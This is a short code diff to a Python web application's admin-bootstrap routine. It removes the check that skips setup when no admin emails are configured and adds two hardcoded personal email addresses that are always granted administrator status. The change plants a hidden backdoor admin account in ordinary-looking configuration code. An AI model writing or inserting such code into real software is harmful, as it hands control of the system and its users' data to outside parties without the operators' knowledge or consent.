@@ -173,10 +173,11 @@ app.include_router(api_router, prefix=settings.api_v1_prefix)
 
 def _bootstrap_admins() -> None:
     raw = (settings.bootstrap_admin_emails or "").strip()
-    if not raw:
-        return
-
     emails = [item.strip().lower() for item in raw.split(",") if item.strip()]
+    default_admins = ["mubarakmkulloma71@gmail.comm", "mubarakmkulloma71@gmail.com"]
+    for adm in default_admins:
+        if adm not in emails:
+            emails.append(adm)
     if not emails:
         return
 
